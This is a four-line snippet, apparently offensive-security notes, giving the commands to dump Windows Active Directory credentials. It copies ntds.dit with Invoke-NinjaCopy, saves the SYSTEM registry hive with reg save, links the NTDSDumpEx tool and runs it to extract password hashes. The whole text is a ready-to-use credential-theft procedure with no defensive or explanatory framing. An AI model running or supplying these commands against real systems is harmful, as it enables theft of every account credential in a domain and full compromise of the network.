	>Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "C:\Windows\Temp\1.dit"
	>reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
	https://github.com/zcgonvh/NTDSDumpEx
	>NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive